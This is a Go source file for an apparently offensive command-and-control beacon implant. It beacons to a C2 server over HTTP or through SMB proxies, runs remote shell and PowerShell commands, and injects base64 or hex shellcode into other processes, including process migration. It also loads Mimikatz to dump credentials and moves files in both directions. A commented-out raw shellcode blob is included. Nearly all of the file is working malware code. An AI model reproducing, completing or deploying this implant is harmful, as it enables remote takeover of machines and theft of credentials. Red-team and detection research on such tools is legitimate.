package main

import (
	"bufio"
	"context"
	b64 "encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"strconv"
	"strings"
	"time"

	ps "github.com/mitchellh/go-ps"
	"github.com/thecodeteam/goodbye"
)

type Beacon struct {
	Ip              string
	Id              string
	ProxyClients    []string
	ExecBuffer      []string
	DownloadBuffer  []string
	UploadBuffer    []string
	ShellcodeBuffer []string
	LastSeen        time.Time
}

var msPerUpdate int = 3000
var cmdProxyIp string
var cmdProxyId string
var cmdAddress string
var cmdPort string
var cmdHost string
var secret string
var id string
var ip string
var pid string
var pipeName string
var pname string
var queryData string
var debug bool = false
var curUser string
var platform string
var arch string
var securityContext BeaconSecurityContext
var msgBuffer []string
var beaconSmbClients []BeaconSmbClient
var beaconHttp *BeaconHttp
var netClient = &http.Client{
	Timeout: time.Second * 10,
}

func handleQueryResponse(encData []byte) {
	data := encData //securityContext.decrypt(encData) // TODO : FIX THIS
	var beaconMsgs []BeaconMessage
	json.Unmarshal(data, &beaconMsgs)

	for _, beaconMsg := range beaconMsgs {
		var commResp CommandResponse

		// get data for proxy beacon via proxyClients
		json.Unmarshal(beaconMsg.Data, &commResp)

		if len(beaconMsg.Route) > 0 {
			json.Unmarshal([]byte(beaconMsg.Data), &commResp)
			if beaconMsg.Route[0] == 0 {
				useCommResp(commResp, beaconHttp)
			} else {
				for _, smbClient := range beaconSmbClients {
					if smbClient.beacon.Id == string(beaconMsg.Route) {
						smbClient.command(beaconMsg.Data)
					}
				}
			}
		}
	}
}

func useCommResp(commResp CommandResponse, packet Request) {
	for i := 0; i < len(commResp.Shellcode); i += 2 {
		var output string
		procId := -1
		shellcode := commResp.Shellcode[i]
		procInfo := strings.Split(commResp.Shellcode[i+1], " ")

		if procInfo[0] != "module" {
			procId, _ = strconv.Atoi(procInfo[1])
		}

		decodedShellcode, err := b64.StdEncoding.DecodeString(shellcode)

		if err != nil {
			debugFatal(err)
			continue
		}

		if procInfo[0] != "module" {
			si := RemoteShellcodeInjector{decodedShellcode, procId}
			err := si.inject()
			if err != nil {
				output = err.Error()
			} else {
				output = ""
			}
		} else {
			si := RemotePipedShellcodeInjector{decodedShellcode, strings.Join(procInfo[1:], " ")}
			output = si.inject()
		}

		var data []byte

		if procInfo[0] == "migrate" {
			var msg string
			if err == nil || err.Error() == "The operation completed successfully." {
				msg = "Success"
				defer packet.exitHandler()
			} else {
				msg = err.Error()
			}

			data, err = json.Marshal(CommandUpdate{ip, id, curUser, platform, arch, pid, pname, "migrate", []byte(msg)})
		} else if procInfo[0] == "module" {
			data, err = json.Marshal(CommandUpdate{ip, id, curUser, platform, arch, pid, pname, "inject", []byte(output)})
		} else {
			data, err = json.Marshal(CommandUpdate{ip, id, curUser, platform, arch, pid, pname, "inject", []byte(output)})
		}

		debugFatal(err)
		encoded := b64.StdEncoding.EncodeToString(data)
		queryCommandHttp(encoded)
	}

	for _, file := range commResp.Download {
		packet.upload(file)
	}

	for _, file := range commResp.Upload {
		packet.download(file)
	}

	for _, client := range commResp.ProxyClients {
		var beacon Beacon
		json.Unmarshal([]byte(client), &beacon)
		fmt.Println("Adding proxy " + beacon.Id)
		packet.addProxyClient(beacon)
	}

	for _, cmd := range commResp.Exec {
		cmdSplit := strings.Fields(cmd)
		output := []byte{}

		if cmdSplit[0] == "exit" || cmdSplit[0] == "quit" {
			packet.exitHandler()
		}

		if cmdSplit[0] == "mimikatz" {
			if platform != "windows" {
				return
			}
			data, _ := hex.DecodeString(mimikatzShellcode)
			injector := RemotePipedShellcodeInjector{
				shellcode: data,
				args:      strings.Join(append(cmdSplit[0:], "exit"), " "),
			}

			out := injector.inject()
			data, err := json.Marshal(CommandUpdate{ip, id, curUser, platform, arch, pid, pname, "mimikatz", []byte(out)})
			debugFatal(err)
			encoded := b64.StdEncoding.EncodeToString(data)
			queryCommandHttp(encoded)
			return
		}

		if cmdSplit[0] == "plist" {
			procs := "------------------------------\nPID\tPPID\tName\n------------------------------"
			procList, _ := ps.Processes()

			for _, p := range procList {
				procs += "\n" + strconv.Itoa(p.Pid()) + "\t" + strconv.Itoa(p.PPid()) + "\t" + p.Executable()
			}

			data, err := json.Marshal(CommandUpdate{ip, id, curUser, platform, arch, pid, pname, "plist", []byte(procs)})
			debugFatal(err)
			encoded := b64.StdEncoding.EncodeToString(data)
			queryCommandHttp(encoded)
			return
		}

		var cmdHandle *exec.Cmd

		if runtime.GOOS == "linux" {
			command := []string{"-c", cmd}
			cmdHandle = exec.Command("/bin/sh", command...)
		} else if runtime.GOOS == "windows" {
			command := []string{"-c", cmd}
			cmdHandle = exec.Command("powershell", command...)
		}

		stderr, err := cmdHandle.StderrPipe()
		stdout, err := cmdHandle.StdoutPipe()

		if err = cmdHandle.Start(); err == nil {
			scanner := bufio.NewScanner(stderr)

			if err != nil {
				output = append(output, scanner.Text()...)
				output = append(output, '\n')
			}

			for scanner.Scan() {
				output = append(output, scanner.Text()...)
				output = append(output, '\n')
			}

			scanner = bufio.NewScanner(stdout)

			if err != nil {
				output = append(output, scanner.Text()...)
				output = append(output, '\n')
			}

			for scanner.Scan() {
				output = append(output, scanner.Text()...)
				output = append(output, '\n')
			}
		}

		if len(output) > 0 {
			data, err := json.Marshal(CommandUpdate{ip, id, curUser, platform, arch, pid, pname, "exec", output})
			debugFatal(err)
			encoded := b64.StdEncoding.EncodeToString(data)
			queryCommandHttp(encoded)
		}
	}
}

func main() {
	securityContext := newBeaconSecurityContext()
	securityContext.key = []byte(secret)

	user, _ := user.Current()
	curUser = user.Username
	platform = runtime.GOOS
	arch = runtime.GOARCH
	pid = strconv.Itoa(os.Getpid())
	p, e := ps.FindProcess(os.Getpid())

	fmt.Println(id + " " + platform + "/" + arch)
	fmt.Println(pid + " : " + p.Executable())
	fmt.Println(e)

	lhost, err := externalIP()
	debugFatal(err)
	ip = lhost
	jsonData, err := json.Marshal(CommandUpdate{ip, id, curUser, platform, arch, pid, p.Executable(), "", nil})
	debugFatal(err)

	//data, _ := hex.DecodeString("4831c94881e9c6ffffff488d05efffffff48bbba56e3141c6ba58248315827482df8ffffffe2f4461e60f0ec836582ba56a2455d3bf7d3ec1ed2c679232ed0da1e684604232ed09a1e68664c23aa35f01cae25d5239442166a82681e4785c37b9fee551daa476fe817b25c97398509f86aab15cce0250aba56e35c99abd1e5f25733449723bdc63116c35d1dbb46d4f2a92a55975f2dcabb80ae25d5239442161722dd112aa44382b696e55068e9a6b213dac569b3fdc63116c75d1dbbc3c3315aab50972bb9cbbb86a29f18e3ed836a17bb554435fcd8fb0ea24d5d31ed015676a246e38bfdc3e30cab9f0e82f27d45a9be5da21cd6b0e565d1141c2af3cb33b0ab95f0cba482ba1f6af155d7a782be849c141c6ae4d6f3df0758959ae438f621c513e3bee90b503ee2151c6bfcc3007f637f1c9470d2ea1bd2dd515a65ca4596ab9dde235a42f2df2255a681aa5d5aa9365c95accf92fb0eaf9dfe232c7bfbec7ab1680a5a57f2d727541e6ba5cb02358e701c6ba582ba17b3554c232c60ed01b4592dabcf8fe317b3f6e00d62c69e02e21554e6e1a6a290e37c54e243d4ea17b3554c2af5cb4596a24455946dcf3397af9ddd2a1ffb766965ebc9239450f2a9299f122a1f8a3d4b83ebc9d055371800a2aebafe181f4583ab97d8439984c65c63effc1ea039fd45917b766bfcc3338c1cc11c6ba582")
	//si := RemoteShellcodeInjector{
	//	data,
	//	4732,
	//}
	//errsi := si.injectModuleStomp()
	//fmt.Println(errsi)

	if cmdProxyIp == "" {
		var encoder = Base64Encoder{
			data: jsonData,
		}

		beaconHttp = &BeaconHttp{
			method: "GET",
			data:   encoder.scramble(),
		}

		ctx := context.Background()
		defer goodbye.Exit(ctx, -1)
		goodbye.Notify(ctx)
		goodbye.Register(func(ctx context.Context, sig os.Signal) {
			beaconHttp.exitHandler()
		})

		for range time.Tick(time.Millisecond * time.Duration(msPerUpdate)) {
			go func() {
				beaconHttp.queryServer()
			}()
		}
	} else {
		var encoder = Base64Encoder{
			data: securityContext.encrypt(jsonData),
		}

		handler := BeaconSmbServer{data: encoder.scramble(), initialized: false}
		handler.start()
	}
}
